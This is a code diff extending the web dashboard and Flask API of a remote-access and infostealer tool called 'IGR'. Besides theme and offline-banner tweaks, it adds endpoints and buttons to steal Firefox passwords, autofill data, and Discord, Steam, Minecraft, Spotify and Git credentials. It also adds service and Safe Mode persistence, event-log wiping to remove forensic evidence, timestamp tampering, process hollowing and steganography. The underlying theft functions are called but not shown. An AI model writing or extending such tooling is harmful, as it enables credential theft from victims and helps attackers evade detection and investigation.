+        body.light-theme .btn { background: rgba(109,40,217,0.1); color: #6d28d9; border-color: rgba(109,40,217,0.3); }
+        body.light-theme .btn:hover { background: rgba(109,40,217,0.2); }
+        body.light-theme .btn.danger { color: #dc2626; border-color: rgba(220,38,38,0.3); }
+        body.light-theme .sidebar { background: #fff; border-color: rgba(109,40,217,0.1); }
+        body.light-theme .nav-item { color: #555; }
+        body.light-theme .nav-item:hover, body.light-theme .nav-item.active { background: rgba(109,40,217,0.08); color: #6d28d9; border-left-color: #6d28d9; }
+        body.light-theme .sidebar-logo { color: #6d28d9; }
+        body.light-theme input, body.light-theme select { background: #f0f0f5; color: #333; border-color: rgba(109,40,217,0.2); }
+        body.light-theme .file-list { background: #f8f8fc; border-color: rgba(109,40,217,0.1); }
+        body.light-theme .file-item:hover { background: rgba(109,40,217,0.05); }
+        body.light-theme .file-item.selected { background: rgba(109,40,217,0.1); }
+        body.light-theme .file-ctx { background: #fff; border-color: rgba(109,40,217,0.2); }
+        body.light-theme .file-ctx button { color: #333; }
+        body.light-theme .file-ctx button:hover { background: rgba(109,40,217,0.08); }
+        body.light-theme .activity-log { background: #f8f8fc; border-color: rgba(109,40,217,0.1); }
+        body.light-theme .activity-log .log-entry { color: #555; border-bottom-color: rgba(109,40,217,0.05); }
+        body.light-theme .status-dot { box-shadow: 0 0 6px rgba(34,197,94,0.3); }
+        body.light-theme .offline-banner { background: #fef2f2; color: #dc2626; border-bottom: 2px solid #dc2626; }
 
         /* Login */
         .login-screen {
@@ -2363,7 +3177,10 @@ DASHBOARD_HTML = r'''
         <div class="sidebar collapsed" id="sidebar">
             <div class="sidebar-header">
                 <div class="sidebar-logo">IGR</div>
-                <button class="sidebar-toggle" onclick="toggleSidebar()">[=]</button>
+                <div style="display:flex;gap:4px;align-items:center;">
+                    <button class="sidebar-toggle" onclick="toggleTheme()" title="Toggle theme" style="font-size:12px;padding:2px 6px;">&#x263e;</button>
+                    <button class="sidebar-toggle" onclick="toggleSidebar()">[=]</button>
+                </div>
             </div>
             <div class="sidebar-status">
                 <div class="status-row"><div class="status-dot" id="connDot"></div><span id="connLabel">Connected</span></div>
@@ -2389,6 +3206,7 @@ DASHBOARD_HTML = r'''
 
         <!-- Main Content -->
         <div class="main-content">
+            <div class="offline-banner" id="offlineBanner" style="display:none;padding:8px 16px;text-align:center;font-weight:bold;font-size:12px;position:sticky;top:0;z-index:100;background:#7f1d1d;color:#fca5a5;border-bottom:2px solid #ef4444;">&#x26a0; Host unreachable - connection lost</div>
             <!-- Home Page -->
             <div class="page active" id="page-home">
                 <div class="command-bar">
@@ -2670,6 +3488,42 @@ DASHBOARD_HTML = r'''
                     <div class="log-box" id="edgeBox">Click Decrypt to extract Edge saved passwords...</div>
                 </div>
                 <div class="section">
+                    <div class="section-header"><div class="section-title">Firefox Passwords</div><button class="btn small" onclick="harvestFirefox()">Decrypt</button></div>
+                    <div class="log-box" id="firefoxBox">Click Decrypt to extract Firefox saved passwords...</div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Browser Autofill</div><button class="btn small" onclick="harvestAutofill()">Extract</button></div>
+                    <div class="log-box" id="autofillBox">Click Extract to get autofill data...</div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Discord Tokens</div><button class="btn small" onclick="harvestDiscord()">Steal</button></div>
+                    <div class="log-box" id="discordBox">Click Steal to extract Discord tokens...</div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Steam Session</div><button class="btn small" onclick="harvestSteam()">Extract</button></div>
+                    <div class="log-box" id="steamBox">Click Extract to get Steam session data...</div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Minecraft Tokens</div><button class="btn small" onclick="harvestMinecraft()">Extract</button></div>
+                    <div class="log-box" id="minecraftBox">Click Extract to get Minecraft launcher tokens...</div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Spotify Credentials</div><button class="btn small" onclick="harvestSpotify()">Extract</button></div>
+                    <div class="log-box" id="spotifyBox">Click Extract to get Spotify credentials...</div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Git Credentials</div><button class="btn small" onclick="harvestGit()">Extract</button></div>
+                    <div class="log-box" id="gitBox">Click Extract to get git credentials...</div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Network Connections</div><button class="btn small" onclick="harvestConnections()">Monitor</button></div>
+                    <div class="log-box" id="connectionsBox">Click Monitor to see live TCP/UDP connections...</div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">USB Device History</div><button class="btn small" onclick="harvestUSB()">Enumerate</button></div>
+                    <div class="log-box" id="usbBox">Click Enumerate to see previously connected USB devices...</div>
+                </div>
+                <div class="section">
                     <div class="section-header"><div class="section-title">Browser Cookies</div><button class="btn small" onclick="harvestCookies()">Steal</button></div>
                     <div class="log-box" id="cookiesBox">Click Steal to extract browser cookies...</div>
                 </div>
@@ -2787,6 +3641,30 @@ DASHBOARD_HTML = r'''
                     <div class="section-header"><div class="section-title">Process Name Spoof</div><button class="btn small" onclick="spoofProcess()">Spoof Now</button></div>
                     <div class="log-box" id="spoofBox">Modifies the PEB to change the process name shown in task manager and process lists to svchost.exe.</div>
                 </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Service Persistence</div><button class="btn small" onclick="stealthService()">Install</button></div>
+                    <div class="log-box" id="serviceBox">Install as Windows Service. Starts before login. Requires admin.</div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Safe Mode Persistence</div><button class="btn small" onclick="stealthSafeMode()">Enable</button></div>
+                    <div class="log-box" id="safeModeBox">Register in SafeBoot keys so IGR runs even in Safe Mode. Requires admin.</div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Wipe Event Logs</div><button class="btn small" onclick="stealthWipeLogs()">Wipe All</button></div>
+                    <div class="log-box" id="wipeLogsBox">Clears Security, System, Application and all other event logs to remove forensic evidence.</div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Process Hollowing</div><button class="btn small" onclick="stealthHollow()">Hollow</button></div>
+                    <div style="display:flex;gap:6px;margin-bottom:8px;"><select id="hollowTarget" style="flex:1;background:#111;color:#ddd;border:1px solid rgba(124,58,237,0.3);border-radius:4px;padding:4px 8px;"><option value="svchost">svchost.exe</option><option value="explorer">explorer.exe</option><option value="taskhostw">taskhostw.exe</option><option value="dllhost">dllhost.exe</option><option value="ctfmon">ctfmon.exe</option></select></div>
+                    <div class="log-box" id="hollowBox">Launch IGR inside a suspended legitimate process for stealth.</div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Steganography</div></div>
+                    <input type="text" id="stegImagePath" placeholder="Image path (e.g., C:\photo.png)" style="width:100%;margin-bottom:6px;">
+                    <input type="text" id="stegSecretData" placeholder="Secret data to hide..." style="width:100%;margin-bottom:6px;">
+                    <div style="display:flex;gap:6px;"><button class="btn small" onclick="stegEncode()" style="flex:1;">Encode</button><button class="btn small" onclick="stegDecode()" style="flex:1;">Decode</button></div>
+                    <div class="log-box" id="stegBox">Hide or extract secret data inside images using LSB steganography.</div>
+                </div>
                 <div class="section" style="grid-column: 1 / -1;">
                     <div class="section-header"><div class="section-title">Current Persistence</div></div>
                     <div id="persistenceInfo" style="line-height: 1.8;">Loading...</div>
@@ -2843,6 +3721,33 @@ DASHBOARD_HTML = r'''
         function toggleSidebar() {
             document.getElementById('sidebar').classList.toggle('collapsed');
         }
+        function toggleTheme() {
+            document.body.classList.toggle('light-theme');
+            const isLight = document.body.classList.contains('light-theme');
+            localStorage.setItem('igr-theme', isLight ? 'light' : 'dark');
+        }
+        if (localStorage.getItem('igr-theme') === 'light') document.body.classList.add('light-theme');
+        let _offlineCheckInterval = null;
+        function startOfflineCheck() {
+            _offlineCheckInterval = setInterval(async () => {
+                try {
+                    const res = await fetch('/api/status', {method: 'GET', signal: AbortSignal.timeout(5000)});
+                    const data = await res.json();
+                    document.getElementById('offlineBanner').style.display = 'none';
+                    const dot = document.getElementById('connDot');
+                    if (dot) { dot.className = 'status-dot'; }
+                    const label = document.getElementById('connLabel');
+                    if (label) label.textContent = 'Connected';
+                } catch {
+                    document.getElementById('offlineBanner').style.display = 'block';
+                    const dot = document.getElementById('connDot');
+                    if (dot) { dot.className = 'status-dot offline'; }
+                    const label = document.getElementById('connLabel');
+                    if (label) label.textContent = 'Offline';
+                }
+            }, 10000);
+        }
+        startOfflineCheck();
         function showPage(name) {
             document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
@@ -3544,6 +4449,69 @@ DASHBOARD_HTML = r'''
             document.getElementById('edgeBox').textContent = data.passwords ? data.passwords.join('\n') : 'None found';
             logActivity('Edge passwords decrypted');
         }
+        async function harvestFirefox() {
+            document.getElementById('firefoxBox').textContent = 'Decrypting...';
+            const res = await fetch('/api/harvest/firefox');
+            const data = await res.json();
+            document.getElementById('firefoxBox').textContent = data.passwords ? data.passwords.join('\n') : 'None found';
+            logActivity('Firefox passwords decrypted');
+        }
+        async function harvestAutofill() {
+            document.getElementById('autofillBox').textContent = 'Extracting...';
+            const res = await fetch('/api/harvest/autofill');
+            const data = await res.json();
+            document.getElementById('autofillBox').textContent = data.autofill ? data.autofill.join('\n') : 'None found';
+            logActivity('Browser autofill extracted');
+        }
+        async function harvestDiscord() {
+            document.getElementById('discordBox').textContent = 'Stealing...';
+            const res = await fetch('/api/harvest/discord');
+            const data = await res.json();
+            document.getElementById('discordBox').textContent = data.tokens ? data.tokens.join('\n') : 'None found';
+            logActivity('Discord tokens stolen');
+        }
+        async function harvestSteam() {
+            document.getElementById('steamBox').textContent = 'Extracting...';
+            const res = await fetch('/api/harvest/steam');
+            const data = await res.json();
+            document.getElementById('steamBox').textContent = data.data ? data.data.join('\n') : 'None found';
+            logActivity('Steam session extracted');
+        }
+        async function harvestMinecraft() {
+            document.getElementById('minecraftBox').textContent = 'Extracting...';
+            const res = await fetch('/api/harvest/minecraft');
+            const data = await res.json();
+            document.getElementById('minecraftBox').textContent = data.data ? data.data.join('\n') : 'None found';
+            logActivity('Minecraft tokens extracted');
+        }
+        async function harvestSpotify() {
+            document.getElementById('spotifyBox').textContent = 'Extracting...';
+            const res = await fetch('/api/harvest/spotify');
+            const data = await res.json();
+            document.getElementById('spotifyBox').textContent = data.data ? data.data.join('\n') : 'None found';
+            logActivity('Spotify credentials extracted');
+        }
+        async function harvestGit() {
+            document.getElementById('gitBox').textContent = 'Extracting...';
+            const res = await fetch('/api/harvest/git');
+            const data = await res.json();
+            document.getElementById('gitBox').textContent = data.data ? data.data.join('\n') : 'None found';
+            logActivity('Git credentials extracted');
+        }
+        async function harvestConnections() {
+            document.getElementById('connectionsBox').textContent = 'Monitoring...';
+            const res = await fetch('/api/harvest/connections');
+            const data = await res.json();
+            document.getElementById('connectionsBox').textContent = data.connections ? data.connections.join('\n') : 'None found';
+            logActivity('Network connections monitored');
+        }
+        async function harvestUSB() {
+            document.getElementById('usbBox').textContent = 'Enumerating...';
+            const res = await fetch('/api/harvest/usb_history');
+            const data = await res.json();
+            document.getElementById('usbBox').textContent = data.devices ? data.devices.join('\n') : 'None found';
+            logActivity('USB device history enumerated');
+        }
         async function harvestCookies() {
             document.getElementById('cookiesBox').textContent = 'Stealing...';
             const res = await fetch('/api/harvest/cookies');
@@ -3656,6 +4624,56 @@ DASHBOARD_HTML = r'''
             const data = await res.json();
             document.getElementById('spoofBox').textContent = data.success ? 'Process name spoofed to svchost.exe in PEB.' : 'Failed: ' + (data.error || 'not supported');
             logActivity('Process spoof: ' + (data.success ? 'success' : 'failed'));
+        }
+        async function stealthService() {
+            document.getElementById('serviceBox').textContent = 'Installing...';
+            const res = await fetch('/api/stealth/service', {method:'POST'});
+            const data = await res.json();
+            document.getElementById('serviceBox').textContent = data.success ? 'Service installed. IGR will start before login.' : 'Failed: ' + (data.error || 'unknown');
+            logActivity('Service persistence: ' + (data.success ? 'installed' : 'failed'));
+        }
+        async function stealthSafeMode() {
+            document.getElementById('safeModeBox').textContent = 'Enabling...';
+            const res = await fetch('/api/stealth/safe_mode', {method:'POST'});
+            const data = await res.json();
+            document.getElementById('safeModeBox').textContent = data.success ? 'Safe Mode persistence enabled for Minimal and Network modes.' : 'Failed: ' + (data.error || 'unknown');
+            logActivity('Safe Mode persistence: ' + (data.success ? 'enabled' : 'failed'));
+        }
+        async function stealthWipeLogs() {
+            if (!confirm('Wipe ALL event logs? This removes forensic evidence.')) return;
+            document.getElementById('wipeLogsBox').textContent = 'Wiping...';
+            const res = await fetch('/api/stealth/wipe_logs', {method:'POST'});
+            const data = await res.json();
+            const cleared = data.results ? Object.entries(data.results).filter(([k,v])=>v==='cleared').map(([k])=>k).join(', ') : 'none';
+            document.getElementById('wipeLogsBox').textContent = data.success ? 'Logs wiped: ' + cleared : 'Failed';
+            logActivity('Event logs wiped: ' + cleared);
+        }
+        async function stealthHollow() {
+            const target = document.getElementById('hollowTarget').value;
+            document.getElementById('hollowBox').textContent = 'Hollowing ' + target + '...';
+            const res = await fetch('/api/stealth/hollow', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target})});
+            const data = await res.json();
+            document.getElementById('hollowBox').textContent = data.success ? 'Hollowed into ' + target + ' (PID: ' + data.pid + ')' : 'Failed: ' + (data.error || 'unknown');
+            logActivity('Process hollowing: ' + (data.success ? target + ' PID:' + data.pid : 'failed'));
+        }
+        async function stegEncode() {
+            const image = document.getElementById('stegImagePath').value;
+            const secret = document.getElementById('stegSecretData').value;
+            if (!image || !secret) { document.getElementById('stegBox').textContent = 'Enter image path and secret data'; return; }
+            document.getElementById('stegBox').textContent = 'Encoding...';
+            const res = await fetch('/api/steganography/encode', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({image, data: secret})});
+            const data = await res.json();
+            document.getElementById('stegBox').textContent = data.success ? 'Data hidden! Output: ' + data.output : 'Failed: ' + (data.error || 'unknown');
+            logActivity('Steganography encode: ' + (data.success ? 'success' : 'failed'));
+        }
+        async function stegDecode() {
+            const image = document.getElementById('stegImagePath').value;
+            if (!image) { document.getElementById('stegBox').textContent = 'Enter image path to decode'; return; }
+            document.getElementById('stegBox').textContent = 'Decoding...';
+            const res = await fetch('/api/steganography/decode', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({image})});
+            const data = await res.json();
+            document.getElementById('stegBox').textContent = data.success ? 'Hidden data: ' + data.data : 'No hidden data found or failed';
+            logActivity('Steganography decode: ' + (data.success ? 'found data' : 'no data'));
         }
         function loadPersistenceInfo() {
             const info = document.getElementById('persistenceInfo');
@@ -5430,6 +6448,182 @@ def stealth_spoof():
     try:
         success = _spoof_process_name()
         return jsonify({'success': success})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/harvest/autofill')
+def harvest_autofill():
+    """Extract browser autofill data."""
+    try:
+        data = _steal_browser_autofill()
+        return jsonify({'success': True, 'autofill': data})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/harvest/firefox')
+def harvest_firefox():
+    """Decrypt Firefox saved passwords."""
+    try:
+        data = _decrypt_firefox_passwords()
+        return jsonify({'success': True, 'passwords': data})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/harvest/discord')
+def harvest_discord():
+    """Extract Discord tokens."""
+    try:
+        data = _steal_discord_tokens()
+        return jsonify({'success': True, 'tokens': data})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/harvest/steam')
+def harvest_steam():
+    """Extract Steam session data."""
+    try:
+        data = _steal_steam_session()
+        return jsonify({'success': True, 'data': data})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/harvest/minecraft')
+def harvest_minecraft():
+    """Extract Minecraft launcher tokens."""
+    try:
+        data = _steal_minecraft_tokens()
+        return jsonify({'success': True, 'data': data})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/harvest/spotify')
+def harvest_spotify():
+    """Extract Spotify credentials."""
+    try:
+        data = _steal_spotify_credentials()
+        return jsonify({'success': True, 'data': data})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/harvest/git')
+def harvest_git():
+    """Extract git credentials."""
+    try:
+        data = _steal_git_credentials()
+        return jsonify({'success': True, 'data': data})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/harvest/connections')
+def harvest_connections():
+    """Get live TCP/UDP connection table."""
+    try:
+        data = _get_network_connections()
+        return jsonify({'success': True, 'connections': data})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/harvest/usb_history')
+def harvest_usb_history():
+    """Enumerate USB device history."""
+    try:
+        data = _get_usb_device_history()
+        return jsonify({'success': True, 'devices': data})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/stealth/service', methods=['POST'])
+def stealth_service():
+    """Install as Windows Service."""
+    try:
+        result = _install_as_service()
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/stealth/safe_mode', methods=['POST'])
+def stealth_safe_mode():
+    """Enable Safe Mode persistence."""
+    try:
+        result = _enable_safe_mode_persistence()
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/stealth/wipe_logs', methods=['POST'])
+def stealth_wipe_logs():
+    """Wipe all event logs."""
+    try:
+        result = _wipe_event_logs()
+        return jsonify({'success': True, 'results': result})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/stealth/event_log', methods=['POST'])
+def stealth_event_log():
+    """Manipulate event logs (list, clear, query)."""
+    try:
+        data = request.get_json()
+        action = data.get('action', 'list')
+        log_name = data.get('log', 'Security')
+        event_id = data.get('event_id')
+        result = _manipulate_event_log(action, log_name, event_id)
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/stealth/timestamp', methods=['POST'])
+def stealth_timestamp():
+    """Modify file timestamps."""
+    try:
+        data = request.get_json()
+        result = _manipulate_timestamps(
+            file_path=data.get('path', ''),
+            reference_path=data.get('reference'),
+            created=data.get('created'),
+            modified=data.get('modified'),
+            accessed=data.get('accessed')
+        )
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/stealth/hollow', methods=['POST'])
+def stealth_hollow():
+    """Process hollowing - inject into legitimate process."""
+    try:
+        data = request.get_json()
+        target = data.get('target', 'svchost')
+        result = _process_hollowing(target)
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/steganography/encode', methods=['POST'])
+def steg_encode():
+    """Hide data inside an image."""
+    try:
+        data = request.get_json()
+        image_path = data.get('image', '')
+        secret = data.get('data', '')
+        output = data.get('output', os.path.join(KEYLOG_DIR, '_steg_output.png'))
+        if not image_path or not secret:
+            return jsonify({'success': False, 'error': 'Missing image path or data'})
+        success = _steganography_encode(image_path, secret, output)
+        return jsonify({'success': success, 'output': output if success else ''})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/steganography/decode', methods=['POST'])
+def steg_decode():
+    """Extract hidden data from an image."""
+    try:
+        data = request.get_json()
+        image_path = data.get('image', '')
+        if not image_path:
+            return jsonify({'success': False, 'error': 'Missing image path'})
+        result = _steganography_decode(image_path)
+        return jsonify({'success': bool(result), 'data': result})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
